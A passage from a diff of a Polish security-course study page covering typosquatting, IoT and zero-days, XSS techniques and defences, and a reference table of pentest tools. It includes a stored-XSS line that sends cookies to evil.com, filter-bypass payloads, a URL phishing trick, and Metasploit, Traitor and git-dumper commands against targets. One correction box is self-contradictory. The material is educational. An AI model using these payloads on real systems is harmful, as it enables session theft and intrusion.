+                        zapomniane lub nie powinny byc publiczne.
+                    </p>
+                </div>
+            </details>
+
+            <h3>Domain Squatting / Typosquatting</h3>
+            <details>
+                <summary>
+                    dnstwist — wykrywanie podszywania sie pod domene
+                </summary>
+                <div class="content">
+                    <p>
+                        <strong>dnstwist</strong> generuje setki permutacji
+                        nazwy domeny i sprawdza, ktore sa zarejestrowane:
+                    </p>
+                    <pre><code># Instalacja:
+pip install dnstwist
+
+# Uzycie:
+dnstwist example.com
+
+# Bardziej szczegolowe skanowanie (z MX, GeoIP, fuzzy hashing):
+dnstwist --registered --mxcheck --geoip example.com</code></pre>
+                    <p>
+                        Typy permutacji: zamiana liter (homoglyph), literowki
+                        (typo), zamiana bitow (bitswap), dodanie/usuniecie
+                        litery, zmiana TLD itp.
+                    </p>
+                    <p>
+                        Jak zapisano: "binarny bitswap wplyw" — dnstwist
+                        uwzglednia tez <strong>bit-flipping</strong> (zamiana
+                        bitow w binarnej reprezentacji nazwy domeny).
+                    </p>
+                    <p>
+                        <a href="https://haveibeensquatted.com" target="_blank"
+                            >haveibeensquatted.com</a
+                        >
+                        — serwis online do sprawdzania czy ktos zaregestrowal
+                        domene podobna do Twojej.
+                    </p>
+                </div>
+            </details>
+        </div>
+
+        <!-- ============================================ -->
+        <!-- SECTION: IoT / SMART DEVICES / ZERO-DAY -->
+        <!-- ============================================ -->
+        <h2 id="iot">
+            <span class="emoji">📱</span> 15. IoT, Smart Devices i Zero-day
+        </h2>
+
+        <div class="section">
+            <div class="tldr">
+                <div class="tldr-label">TL;DR</div>
+                <p>
+                    Urzadzenia IoT (routery, kamery, smart zamki) sa czesto
+                    <strong>najslabszym ogniwem</strong> sieci — rzadko
+                    aktualizowane, z domyslnymi haslami, slabym szyfrowaniem.
+                    Zero-day to podatnosc, o ktorej producent
+                    <strong>jeszcze nie wie</strong> — nie ma na nia patcha.
+                </p>
+            </div>
+
+            <h3>Co to jest Zero-day?</h3>
+            <details>
+                <summary>Zero-day — dlaczego "zero dni"?</summary>
+                <div class="content">
+                    <p>
+                        <span class="key-term">Zero-day</span> (0-day) =
+                        podatnosc, ktora jest znana atakujacym, ale
+                        <strong>producent jeszcze nie wydal poprawki</strong>.
+                        Nazwa pochodzi stad, ze producent ma "zero dni" na
+                        naprawe — exploit juz jest na wolnosci.
+                    </p>
+                    <p><strong>Cykl zycia podatnosci:</strong></p>
+                    <ul>
+                        <li>
+                            <strong>0-day</strong>: podatnosc odkryta, brak
+                            patcha. Najcenniejsza (i najdrozsza na czarnym
+                            rynku).
+                        </li>
+                        <li>
+                            <strong>1-day</strong>: patch wydany, ale wiekszosc
+                            systemow jeszcze nie zaktualizowana. Nadal bardzo
+                            grozne.
+                        </li>
+                        <li>
+                            <strong>N-day</strong>: patch od dawna dostepny, ale
+                            leniwi admini nadal go nie wdrozyli. Wiele atakow
+                            uzywa wlasnie tych!
+                        </li>
+                    </ul>
+                    <p>
+                        Ceny zero-dayow na rynku: exploit na iPhone/iOS moze
+                        kosztowac <strong>1-2 mln USD</strong>, Android
+                        <strong>~2.5 mln USD</strong>, Windows
+                        <strong>do 1 mln USD</strong>. Firmy jak Zerodium
+                        publicznie skupuja exploity.
+                    </p>
+                </div>
+            </details>
+
+            <h3>Powierzchnia ataku IoT</h3>
+            <details>
+                <summary>
+                    Firmware, UART, BLE — jak atakuje sie smart urzadzenia?
+                </summary>
+                <div class="content">
+                    <p>
+                        Jak fragmentarycznie zapisano w notatkach: "mapowac
+                        chipki, firmware, transmisso" — chodzilo o typowe
+                        wektory ataku na IoT:
+                    </p>
+                    <ul>
+                        <li>
+                            <strong>Firmware extraction</strong> — pobranie
+                            oprogramowania z urzadzenia (np. z pamieci flash) i
+                            analiza w poszukiwaniu hasel, kluczy, backdoorow
+                            <pre><code># Narzedzia do ekstrakcji firmware:
+binwalk firmware.bin        # automatycznie rozpoznaje i rozpakowuje
+strings firmware.bin | grep -i "password\|secret\|key"</code></pre>
+                        </li>
+                        <li>
+                            <strong>UART / JTAG</strong> — porty diagnostyczne
+                            na plytce drukowanej. Czesto niezabezpieczone —
+                            podlaczasz sie i dostajesz
+                            <strong>root shella</strong> urzadzenia
+                        </li>
+                        <li>
+                            <strong>BLE (Bluetooth Low Energy)</strong> — wiele
+                            smart urzadzen komunikuje sie przez BLE bez
+                            szyfrowania lub z domyslnymi kluczami
+                        </li>
+                        <li>
+                            <strong>Transmisja radiowa</strong> — routery, bramy
+                            IoT, sensory — mozna podsluchac i wstrzyknac dane
+                            (np. SDR — Software Defined Radio)
+                        </li>
+                    </ul>
+                </div>
+            </details>
+
+            <details>
+                <summary>Smart urzadzenia — realne zagrozenia</summary>
+                <div class="content">
+                    <p>
+                        Z notatek ze szkolenia: "smart zamek z Zero-day, moze
+                        mapowac chipki, firmware" i "Bank, telefony z oszustwem"
+                        — prowadzacy wspominal o realnych scenariuszach:
+                    </p>
+                    <ul>
+                        <li>
+                            <strong>Smart zamki</strong> — wiele z nich mozna
+                            otworzyc przez BLE replay attack lub exploitation
+                            firmware. Jeden zero-day = fizyczny dostep do domu.
+                        </li>
+                        <li>
+                            <strong>Smishing / vishing</strong> — fałszywe SMS-y
+                            i telefony z bankow ("telefony z oszustwem").
+                            Atakujacy podszywaja sie pod numer banku (spoofing
+                            caller ID) i nakladaja do podania danych logowania.
+                        </li>
+                        <li>
+                            <strong>Smart gateway</strong> — bramka IoT (hub
+                            laczacy smart urzadzenia) — jesli zhakowana,
+                            atakujacy kontroluje
+                            <strong>wszystkie</strong> polaczone urzadzenia:
+                            kamery, zamki, termostaty.
+                        </li>
+                        <li>
+                            <strong>Fonty na rynku niemieckim</strong> — z
+                            notatek: "font na rynku niemieckim, uczacy
+                            wydajnosciowe" — prawdopodobnie chodzilo o exploit w
+                            czcionkach (font parsing vulnerability) uzywanych w
+                            specyficznych aplikacjach, co prowadzilo do remote
+                            code execution.
+                        </li>
+                    </ul>
+
+                    <div class="warn">
+                        <div class="warn-label">Zasady bezpieczenstwa IoT</div>
+                        <p>
+                            <strong>Dla uzytkownikow:</strong> zmien domyslne
+                            hasla, aktualizuj firmware, oddziel IoT na osobna
+                            siec (VLAN).
+                            <strong>Dla producentow:</strong> szyfruj
+                            komunikacje, podpisuj firmware, nie zostawiaj portow
+                            UART otwartych w produkcji, wdrozyli program bug
+                            bounty.
+                        </p>
+                    </div>
+                </div>
+            </details>
+        </div>
+
+        <!-- ============================================ -->
+        <!-- SECTION 16: INJECTION / XSS -->
+        <!-- ============================================ -->
+        <h2 id="injection">
+            <span class="emoji">💉</span> 16. Injection i XSS — Wstrzykiwanie
+            kodu
+        </h2>
+
+        <div class="section">
+            <div class="tldr">
+                <div class="tldr-label">TL;DR</div>
+                <p>
+                    Injection to cala rodzina atakow, w ktorych
+                    <strong>dane i kod sa wymienne</strong> — atakujacy
+                    wstrzykuje dane, ktore serwer/przegladarka interpretuje jako
+                    kod. XSS (Cross-Site Scripting) to najczestszy podtyp: obce
+                    skrypty JS uruchamiaja sie w przegladarce ofiary.
+                </p>
+            </div>
+
+            <h3>Model mentalny: Dane i Kod sa wymienne</h3>
+            <p>
+                W tradycyjnej architekturze webowej HTML, JS i dane uzytkownika
+                mieszaja sie w jednym strumieniu. To dlatego wpisanie
+                <code>&lt;script&gt;</code> w komentarzu moze stac sie
+                <em>kodem</em>, nie <em>danymi</em>.
+            </p>
+
+            <details>
+                <summary>
+                    Alternatywne architektury — separacja kodu i danych
+                </summary>
+                <div class="content">
+                    <p>
+                        Nowoczesne podejscia stawiaja na
+                        <strong>oddzielenie kodu od danych</strong>:
+                    </p>
+                    <ul>
+                        <li>
+                            <strong>Content Security Policy (CSP)</strong> —
+                            naglowek HTTP mowiacy przegladarce: "uruchamiaj
+                            TYLKO skrypty z tych zrodel"
+                        </li>
+                        <li>
+                            <strong>Trusted Types API</strong> — wymusza, ze do
+                            <code>innerHTML</code> mozna wstawic tylko "zaufane"
+                            obiekty, nie surowy string
+                        </li>
+                        <li>
+                            <strong>setHTML()</strong> — nowe API przegladarki,
+                            ktore automatycznie sanityzuje HTML (wiecej nizej)
+                        </li>
+                    </ul>
+                    <p>
+                        Zasada: im bardziej kod i dane sa oddzielone, tym
+                        trudniejszy injection.
+                    </p>
+                </div>
+            </details>
+        </div>
+
+        <div class="section">
+            <div class="section-title">🔥 Remote Code Execution przez XSS</div>
+
+            <div class="tldr">
+                <div class="tldr-label">TL;DR</div>
+                <p>
+                    XSS pozwala atakujacemu
+                    <strong>odpalic dowolny JavaScript</strong> w przegladarce
+                    ofiary. To oznacza: kradziez ciasteczek sesji, przechwycenie
+                    hasel, podmiane zawartosci strony, keylogging — wszystko co
+                    moze JS.
+                </p>
+            </div>
+
+            <h3>XSS Stored vs Reflected</h3>
+
+            <details>
+                <summary>Stored XSS — trwaly, uderza w kazdego</summary>
+                <div class="content">
+                    <p>
+                        <span class="key-term">Stored XSS</span> = zlośliwy kod
+                        jest <strong>zapisany na serwerze</strong> (np. w bazie
+                        danych) i serwowany kazdemu uzytkownikowi.
+                    </p>
+                    <p>
+                        <strong>Klasyczny scenariusz:</strong> komentarz na
+                        forum zawierajacy kod JS:
+                    </p>
+                    <pre><code>&lt;!-- Atakujacy wpisuje jako komentarz: --&gt;
+Swietny artykul! &lt;script&gt;
+  fetch('https://evil.com/steal?cookie=' + document.cookie)
+&lt;/script&gt;
+
+&lt;!-- Serwer zapisuje do bazy, potem wyswietla innym --&gt;
+&lt;!-- Kazdy kto wejdzie na strone — uruchomi skrypt! --&gt;</code></pre>
+                    <p>
+                        Najgrozniejszy typ — atakujacy "infekuje" strone raz, a
+                        potem kazdy odwiedzajacy jest ofiara.
+                    </p>
+                </div>
+            </details>
+
+            <details>
+                <summary>
+                    Reflected XSS — jednorazowy, wymaga klikniecia
+                </summary>
+                <div class="content">
+                    <p>
+                        <span class="key-term">Reflected XSS</span> = zlośliwy
+                        kod jest <strong>w URL-u</strong> i serwer "odbija" go w
+                        odpowiedzi HTML.
+                    </p>
+                    <pre><code>&lt;!-- URL z wstrzyknietym kodem: --&gt;
+https://szukaj.pl/wyniki?q=&lt;script&gt;alert(1)&lt;/script&gt;
+
+&lt;!-- Serwer generuje HTML: --&gt;
+&lt;p&gt;Wyniki wyszukiwania dla: &lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;
+&lt;!-- Przegladarka uruchamia skrypt! --&gt;</code></pre>
+                    <p>
+                        Dotyczy
+                        <strong>tylko tego, kto kliknie w zlośliwy link</strong
+                        >. Czesto rozpowszechniany przez phishing.
+                    </p>
+                </div>
+            </details>
+
+            <div class="anecdote">
+                <div class="anecdote-label">
+                    Ze szkolenia — navigator.credentials
+                </div>
+                <p>
+                    Prowadzacy wspomnial o
+                    <code>navigator.credentials.get()</code> — Credential
+                    Management API, ktore pozwala przegladarce na automatyczne
+                    logowanie. Po weryfikacji biometrycznej (np. odcisk palca)
+                    przegladarka zwraca dane logowania jako Promise.
+                </p>
+                <p>
+                    W kontekscie XSS: jesli atakujacy uruchomi skrypt na
+                    stronie,
+                    <strong
+                        >moze wywolac to API i potencjalnie uzyskac dane
+                        logowania uzytkownika!</strong
+                    >
+                </p>
+            </div>
+
+            <div class="warn">
+                <div class="warn-label">Korekta z notatek</div>
+                <p>
+                    W notatkach zapisano
+                    <code>navigator.credentials.get({password: true})</code> —
+                    dokladna skladnia jest inna. Poprawne wywolanie to
+                    <code>navigator.credentials.get({password: true})</code> dla
+                    <code>PasswordCredential</code>, ale nowsze przegladarki
+                    preferuja WebAuthn (<code>{publicKey: ...}</code>) z
+                    biometria. Zasada jest taka sama: API zwraca Promise z
+                    danymi uwierzytelniajacymi po weryfikacji uzytkownika.
+                </p>
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-title">🎯 Sposoby XSS — Kreatywne techniki</div>
+
+            <div class="tldr">
+                <div class="tldr-label">TL;DR</div>
+                <p>
+                    Filtry XSS blokuja <code>&lt;script&gt;</code>? Nie ma
+                    problemu. Istnieja <strong>dziesiatki sposobow</strong> na
+                    uruchomienie JS bez uzycia tagu script — przez atrybuty
+                    zdarzen, template literals, Unicode, a nawet same 6 znakow
+                    (<code>[]()!+</code>).
+                </p>
+            </div>
+
+            <details>
+                <summary>1. Atrybut onerror na &lt;img&gt; — klasyka</summary>
+                <div class="content">
+                    <p>
+                        Nie trzeba <code>&lt;script&gt;</code> — wystarczy
+                        dowolny tag HTML z atrybutem zdarzenia:
+                    </p>
+                    <pre><code>&lt;!-- Obraz z nieprawidlowym src → wywoluje onerror --&gt;
+&lt;img src="/" onerror="alert('XSS!')"&gt;
+
+&lt;!-- Inne tagi i zdarzenia: --&gt;
+&lt;body onload="alert('XSS!')"&gt;
+&lt;svg onload="alert('XSS!')"&gt;
+&lt;input onfocus="alert('XSS!')" autofocus&gt;
+&lt;marquee onstart="alert('XSS!')"&gt;</code></pre>
+                    <p>
+                        Dlaczego dziala: przegladarka parsuje HTML → znajduje
+                        tag → laduje atrybuty → uruchamia event handler. Filtr
+                        musi blokowac <strong>WSZYSTKIE</strong> atrybuty
+                        zdarzen, nie tylko <code>onclick</code>.
+                    </p>
+                </div>
+            </details>
+
+            <details>
+                <summary>
+                    2. Tagged Template Literals — funkcja bez nawiasow
+                </summary>
+                <div class="content">
+                    <p>
+                        W JavaScript mozna
+                        <strong>wywolac funkcje bez nawiasow okraglych</strong>
+                        uzywajac template literals (backticki):
+                    </p>
+                    <pre><code>// Normalne wywolanie:
+alert("hello")
+
+// Wywolanie przez tagged template literal:
+alert`hello`
+
+// To dziala, bo JS interpretuje to jako:
+// alert(["hello"])  — tagged template literal</code></pre>
+                    <p>
+                        Dlaczego to wazne dla XSS? Wiele filtrow (WAF) blokuje
+                        nawiasy <code>()</code>. Template literals to
+                        <strong>obejscie</strong>.
+                    </p>
+
+                    <p>
+                        <strong>Zaawansowane:</strong> mozna tez uzyc
+                        <code>.call</code> z template literals:
+                    </p>
+                    <pre><code>// Proste wywolanie .call:
+// prompt.call`${1}` — nie dziala bezposrednio
+// Ale warianty z tagged templates:
+// [].sort.call`${alert}` — rozne tricki z .call i tagged templates
+// Wiecej przykladow na prompt.ml i alf.nu</code></pre>
+
+                    <div class="warn">
+                        <div class="warn-label">Korekta z notatek</div>
+                        <p>
+                            Zapis <code>prompt.call`${1}`</code> nie jest
+                            poprawna skladnia JS — <code>.call()</code> wymaga
+                            nawiasow. Prowadzacy prawdopodobnie pokazywal rozne
+                            warianty tagged templates i
+                            <code>.call</code> osobno jako techniki omijania
+                            filtrow. Sam <code>alert`1`</code> lub
+                            <code>confirm`1`</code> to juz wystarczajacy dowod
+                            na XSS.
+                        </p>
+                    </div>
+                </div>
+            </details>
+
+            <details>
+                <summary>3. Trik z @ w URL — phishing przez adres</summary>
+                <div class="content">
+                    <p>
+                        W specyfikacji URL (RFC 3986) znak
+                        <code>@</code> oddziela dane uwierzytelniajace od hosta:
+                    </p>
+                    <pre><code>https://user:password@host.com/
+
+// Trik phishingowy:
+https://twoj-bank.pl/@zlodziej.com/phishing.html
+// Przegladarka traktuje "twoj-bank.pl/" jako credentials
+// i laczy sie z zlodziej.com!
+
+// Z enkodowaniem slasha:
+https://twoj-bank.pl%2F@zlodziej.com/script.js
+// %2F = / zakodowany → caly "twoj-bank.pl/" to "user"
+// Cel: zlodziej.com</code></pre>
+                    <p>
+                        Ofiara widzi "twoj-bank.pl" na poczatku URL-a i mysli,
+                        ze jest na prawidlowej stronie. Wiele nowoczesnych
+                        przegladarek juz ostrzega lub blokuje ten trik, ale nie
+                        wszystkie.
+                    </p>
+                </div>
+            </details>
+
+            <details>
+                <summary>4. Unicode i nietypowe znaki nowej linii</summary>
+                <div class="content">
+                    <p>
+                        Filtry XSS czesto sprawdzaja tylko
+                        <code>\r</code> (U+000D) i <code>\n</code> (U+000A) jako
+                        znaki nowej linii. Ale Unicode ma <strong>inne</strong>:
+                    </p>
+                    <pre><code>// U+2028 — LINE SEPARATOR
+// U+2029 — PARAGRAPH SEPARATOR
+
+// Te znaki sa traktowane jako nowe linie w JS,
+// ale NIE sa lapane przez wiele regexow:
+/^[^\n\r]*$/.test("abc\u2028def")  // true! (regex nie widzi)
+// Ale JS traktuje U+2028 jako koniec linii!</code></pre>
+                    <p>
+                        Mozna uzyc tych znakow do "zlamania" regexow multiline,
+                        ktore maja blokowac injection.
+                    </p>
+                </div>
+            </details>
+
+            <details>
+                <summary>5. JSFuck — JavaScript z 6 znakow</summary>
+                <div class="content">
+                    <p>
+                        <span class="key-term">JSFuck</span> to technika, w
+                        ktorej <strong>dowolny kod JavaScript</strong> mozna
+                        napisac uzywajac TYLKO 6 znakow:
+                        <code>[ ] ( ) ! +</code>
+                    </p>
+                    <pre><code>// Podstawowe prymitywy:
+![]        // => false
+!![]       // => true
++[]        // => 0
++!+[]      // => 1
+1/0        // => Infinity  (ale 1/0 uzywa dodatkowych znakow)
+
+// Budowanie stringow:
+![] + ""              // => "false"
+(![]+[])[+[]]         // => "f"  (pierwszy znak "false")
+(![]+[])[+!+[]]       // => "a"  (drugi znak "false")
+
+// Skladanie slow:
+// "false" + "true" + [object Object]
+// => "falsetrue[object Object]"
+// Z tego stringa mozna wyciagnac litery: c,o,n,s,t,r,u,c,t,o,r
+// I wywolac: []["constructor"]["constructor"]
+//   = Array.constructor = Function
+// Function("alert(1)")() — BOOM, XSS!</code></pre>
+                    <p>
+                        Strona
+                        <a href="https://jsfuck.com/" target="_blank"
+                            >jsfuck.com</a
+                        >
+                        — konwerter JS → JSFuck. <code>alert(1)</code> to okolo
+                        4325 znakow w JSFuck.
+                    </p>
+                    <p>
+                        Znaczenie: jesli filtr blokuje litery i cyfry, ale
+                        przepuszcza <code>[]()!+</code> — nadal mozna wykonac
+                        dowolny kod.
+                    </p>
+                </div>
+            </details>
+
+            <details>
+                <summary>6. Markdown jako wektor XSS</summary>
+                <div class="content">
+                    <p>
+                        Markdown jest
+                        <strong>nadzbiorem HTML</strong> (superset) — mozna w
+                        nim osadzac surowy HTML. To oznacza, ze jesli aplikacja
+                        renderuje Markdown bez sanityzacji, mozna wstrzyknac:
+                    </p>
+                    <pre><code>&lt;!-- W pliku Markdown: --&gt;
+# Normalna tresc
+
+&lt;div onmouseover="alert('XSS')"&gt;Najedz na mnie&lt;/div&gt;
+&lt;svg onload="alert('XSS')"&gt;</code></pre>
+                    <p>
+                        Jak zapisano w notatkach: "markdown tez moze miec html
+                        (superset html) — podatny". Dotyczy to np. dashboardow z
+                        widgetami Markdown, README na GitHubie (GitHub
+                        sanityzuje), wiki, komentarzy.
+                    </p>
+                    <p>
+                        <strong>Alternatywa:</strong> uzywaj formatow
+                        <strong>inne niz HTML-based</strong>, np.
+                        <strong>Markup</strong> z inna skladnia (BBCode,
+                        AsciiDoc z wylaczonym HTML) — "zamiast markdown →
+                        markup" z notatek.
+                    </p>
+                </div>
+            </details>
+        </div>
+
+        <div class="section">
+            <div class="section-title">🛡️ Zabezpieczenia przed XSS</div>
+
+            <div class="tldr">
+                <div class="tldr-label">TL;DR</div>
+                <p>
+                    <strong>Escaping</strong> (nie sanityzacja!) to podstawa
+                    obrony. Ale uwaga: escapowanie jest
+                    <strong>kontekstowe</strong> — co chroni w HTML, nie chroni
+                    w JS. Nowe API <code>setHTML()</code> jest najwygodniejsze,
+                    ale jeszcze nie wszedzie wspierane.
+                </p>
+            </div>
+
+            <h3>Escaping vs Sanityzacja</h3>
+            <details>
+                <summary>Dlaczego escaping jest lepszy od sanityzacji?</summary>
+                <div class="content">
+                    <p>
+                        <strong>Sanityzacja</strong> = usuwanie niebezpiecznych
+                        elementow (np. usun <code>&lt;script&gt;</code>).
+                        Problem: atakujacy znajda sposob, ktory sanitizer
+                        pominie.
+                    </p>
+                    <p>
+                        <strong>Escaping</strong> = zamiana znakow specjalnych
+                        na bezpieczne odpowiedniki. Ciag znakow jest wklejany do
+                        HTML <strong>bez zmiany struktury HTML</strong>:
+                    </p>
+                    <pre><code>// Escaping HTML:
+&lt;  →  &amp;lt;
+&gt;  →  &amp;gt;
+"  →  &amp;quot;
+'  →  &amp;#39;
+&amp;  →  &amp;amp;
+
+// Biblioteka: escape-goat (npm)
+// Uzycie jako tagged template literal:
+import {htmlEscape} from 'escape-goat';
+const safe = htmlEscape`&lt;script&gt;alert(1)&lt;/script&gt;`;
+// Wynik: "&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"
+// Przegladarka wyswietli tekst, nie uruchomi kodu!</code></pre>
+                </div>
+            </details>
+
+            <h3>Kontekstowe escapowanie — klucz do bezpieczenstwa</h3>
+            <details>
+                <summary>Rozne konteksty = rozne escaping</summary>
+                <div class="content">
+                    <p>
+                        Jak zapisano w notatkach:
+                        <em
+                            >"escapuje sie dla czegos konkretnego — inaczej do
+                            HTML inaczej do JS — escape robimy kontekstowo"</em
+                        >. To kluczowa zasada!
+                    </p>
+                    <pre><code>&lt;!-- Kontekst 1: HTML body --&gt;
+&lt;p&gt;Witaj, &amp;lt;script&amp;gt; nie uruchomi sie&lt;/p&gt;
+&lt;!-- Escaping: &lt; → &amp;lt;  &gt; → &amp;gt; --&gt;
+
+&lt;!-- Kontekst 2: Atrybut HTML --&gt;
+&lt;input value="dane &amp;quot; onclick=&amp;quot;xss"&gt;
+&lt;!-- Escaping: " → &amp;quot; --&gt;
+
+&lt;!-- Kontekst 3: Wewnatrz &lt;script&gt; --&gt;
+&lt;script&gt;
+  var data = "dane \x3cscript\x3e"; // HTML escaping tu NIE dziala!
+  // Trzeba JS escaping: < → \x3c   > → \x3e
+&lt;/script&gt;
+
+&lt;!-- Kontekst 4: URL / query parameters --&gt;
+?q=&lt;script&gt;prompt(1)&lt;/script&gt;
+&lt;!-- Escaping: encodeURIComponent() --&gt;
+?q=%3Cscript%3Eprompt(1)%3C%2Fscript%3E</code></pre>
+
+                    <div class="warn">
+                        <div class="warn-label">
+                            Czerwona flaga przy code review
+                        </div>
+                        <p>
+                            Jesli widzisz escapowanie "ogolne" (jeden escape do
+                            wszystkiego) — to <strong>blad</strong>. Kazdy
+                            kontekst wymaga swojego escapingu. HTML escape NIE
+                            chroni wewnatrz <code>&lt;script&gt;</code>!
+                        </p>
+                    </div>
+
+                    <p>
+                        <strong>toJSON / |tojson:</strong> jak zapisano w
+                        notatkach — uzywaj <code>|tojson</code> (filtr Jinja2)
+                        lub <code>JSON.stringify()</code> do wstawiania danych w
+                        kontekscie JS. Struktura zostaje zachowana, a
+                        niebezpieczne znaki sa escapowane. Ale uwaga:
+                        <code>JSON.stringify()</code> nie escapuje
+                        <code>/</code> ani <code>&lt;</code> — dodaj wlasne
+                        escapowanie dla kontekstu <code>&lt;script&gt;</code>.
+                    </p>
+                </div>
+            </details>
+
+            <h3>setHTML() — nowoczesna alternatywa dla innerHTML</h3>
+            <details>
+                <summary>
+                    Jak dziala setHTML() i dlaczego jest bezpieczniejsze?
+                </summary>
+                <div class="content">
+                    <p>
+                        <code>setHTML()</code> to nowe API przegladarki, ktore
+                        automatycznie <strong>sanityzuje HTML</strong> przed
+                        wstawieniem do DOM:
+                    </p>
+                    <pre><code>// Stary, niebezpieczny sposob:
+element.innerHTML = userInput;
+// Jesli userInput = '&lt;img src=x onerror=alert(1)&gt;' → XSS!
+
+// Nowy, bezpieczny sposob:
+element.setHTML(userInput);
+// Automatycznie usuwa: &lt;script&gt;, &lt;iframe&gt;, &lt;embed&gt;
+// Automatycznie usuwa: onclick, onerror, onload...
+// Wynik: czysty, bezpieczny HTML
+
+// Z opcjami (whitelist dozwolonych elementow):
+element.setHTML(userInput, {
+  sanitizer: new Sanitizer({
+    allowElements: ['b', 'i', 'em', 'strong', 'a']
+  })
+});</code></pre>
+                    <p>
+                        <strong>Wsparcie przegladarek:</strong> Firefox 148+ (od
+                        lutego 2026). Chrome/Edge — eksperymentalnie za flaga.
+                        <strong>Na produkcji:</strong> uzywaj
+                        <a
+                            href="https://github.com/cure53/DOMPurify"
+                            target="_blank"
+                            >DOMPurify</a
+                        >
+                        jako fallback.
+                    </p>
+                </div>
+            </details>
+
+            <h3>Dodatkowe zabezpieczenia</h3>
+            <details>
+                <summary>Content Security Policy, Trusted Types i inne</summary>
+                <div class="content">
+                    <ul>
+                        <li>
+                            <strong>Content Security Policy (CSP)</strong> —
+                            naglowek HTTP ograniczajacy zrodla skryptow:
+                            <pre><code>Content-Security-Policy: script-src 'self' https://cdn.example.com</code></pre>
+                            Nawet jesli XSS wstrzyknie
+                            <code>&lt;script&gt;</code> — przegladarka nie
+                            uruchomi go, bo zrodlo nie jest na liscie.
+                        </li>
+                        <li>
+                            <strong>Escapowanie query parameters</strong> —
+                            zawsze uzywaj <code>encodeURIComponent()</code>:
+                            <pre><code>// ZLE:
+url = "/search?q=" + userInput;
+
+// DOBRZE:
+url = "/search?q=" + encodeURIComponent(userInput);</code></pre>
+                        </li>
+                        <li>
+                            <strong>HttpOnly cookies</strong> — ciasteczka sesji
+                            z flaga <code>HttpOnly</code> nie sa dostepne przez
+                            <code>document.cookie</code> — nawet XSS ich nie
+                            ukradnie
+                        </li>
+                    </ul>
+                </div>
+            </details>
+        </div>
+
+        <div class="section">
+            <div class="section-title">🧩 Cwiczenia — strony do nauki XSS</div>
+            <div class="tldr">
+                <div class="tldr-label">TL;DR</div>
+                <p>
+                    Najlepsza nauka to praktyka. Te strony sa legalnym poligonem
+                    do cwiczenia XSS:
+                </p>
+            </div>
+            <ul>
+                <li>
+                    <a href="https://prompt.ml/" target="_blank"
+                        ><strong>prompt.ml</strong></a
+                    >
+                    — 16 poziomow + 4 ukryte. Klasyczne wyzwania XSS z roznym
+                    poziomem trudnosci (wspomniane na szkoleniu; mozliwe ze
+                    dostepne tez na Web Archive).
+                </li>
+                <li>
+                    <a href="https://escape.alf.nu/" target="_blank"
+                        ><strong>escape.alf.nu</strong></a
+                    >
+                    — "alert(1) to win!" — 15 wyzwan na omijanie filtrow XSS
+                    (wspomniane na szkoleniu).
+                </li>
+                <li>
+                    <a href="https://jsfuck.com/" target="_blank"
+                        ><strong>jsfuck.com</strong></a
+                    >
+                    — konwerter dowolnego JS na JSFuck (tylko
+                    <code>[]()!+</code>).
+                </li>
+            </ul>
+        </div>
+
+        <!-- ============================================ -->
+        <!-- SECTION 16: QUICK REFERENCE -->
+        <!-- ============================================ -->
+        <hr class="divider" />
+        <h2 id="reference">
+            <span class="emoji">⚡</span> 17. Szybka referencja — Narzedzia i
+            strony
+        </h2>
+
+        <p>
+            Kompletna lista narzedzi i stron wspomnianych na szkoleniu, z
+            krotkim opisem i przykladami uzycia.
+        </p>
+
+        <!-- TOOLS -->
+        <div class="ref-section">
+            <h3>🛠️ Narzedzia (z przykladami kodu)</h3>
+
+            <table>
+                <tr>
+                    <th style="width: 18%">Narzedzie</th>
+                    <th style="width: 35%">Opis</th>
+                    <th style="width: 47%">Przyklad uzycia</th>
+                </tr>
+                <tr>
+                    <td>
+                        <strong>Metasploit</strong><br /><span
+                            class="tag tag-tool"
+                            >exploit</span
+                        >
+                    </td>
+                    <td>
+                        Framework do testow penetracyjnych. Zawiera setki
+                        exploitow, payloadow i modulow.
+                    </td>
+                    <td>
+                        <pre><code>msfconsole
+use exploit/multi/http/liferay_java_unmarshalling
+set RHOSTS target.com
+set LHOST your-ip
+exploit</code></pre>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <strong>DirBuster</strong><br /><span
+                            class="tag tag-tool"
+                            >recon</span
+                        >
+                    </td>
+                    <td>Brute-force katalogow i plikow na serwerze (OWASP).</td>
+                    <td>
+                        <pre><code># Lub nowszy odpowiednik — gobuster:
+gobuster dir \
+  -u https://target.com \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -t 50</code></pre>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <strong>Burp Suite</strong><br /><span
+                            class="tag tag-tool"
+                            >proxy</span
+                        >
+                    </td>
+                    <td>
+                        Proxy HTTP/HTTPS do przechwytywania, modyfikacji i
+                        powtarzania zapytan.
+                    </td>
+                    <td>
+                        <pre><code># 1. Uruchom Burp Suite
+# 2. Ustaw proxy w przegladarce: 127.0.0.1:8080
+# 3. Zainstaluj certyfikat CA Burpa
+# 4. Korzystaj z zakladek:
+#    - Proxy: przechwytywanie
+#    - Repeater: powtarzanie zapytan
+#    - Intruder: brute-force parametrow</code></pre>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <strong>Traitor</strong><br /><span class="tag tag-tool"
+                            >privesc</span
+                        >
+                    </td>
+                    <td>
+                        Automatyczna eskalacja uprawnien na Linux. Skanuje
+                        GTFOBins, CVE.
+                    </td>
+                    <td>
+                        <pre><code># Pobranie:
+curl -sL https://github.com/liamg/traitor/releases/latest/download/traitor-amd64 -o traitor
+chmod +x traitor
+
+# Skanowanie:
+./traitor
+
+# Automatyczna eksploitacja:
+./traitor -a</code></pre>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <strong>git-dumper</strong><br /><span
+                            class="tag tag-tool"
+                            >recon</span
+                        >
+                    </td>
+                    <td>
+                        Pobieranie odslonienych repozytoriow .git ze stron www.
+                    </td>
+                    <td>
+                        <pre><code># Instalacja:
+pipx install git-dumper
+
+# Uzycie:
+git-dumper https://target.com/.git/ ./output
+
+# Po pobraniu:
+cd output && git log
+grep -r "secret\|password\|key" .</code></pre>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <strong>DotGit</strong><br /><span class="tag tag-tool"
+                            >recon</span
+                        >
+                    </td>
+                    <td>
+                        Rozszerzenie przegladarki — automatycznie wykrywa
+                        odsłoniete .git, .svn, .env.
+                    </td>
+                    <td>
+                        <pre><code># Instalacja:
+# Firefox: addons.mozilla.org
+#   szukaj "DotGit"
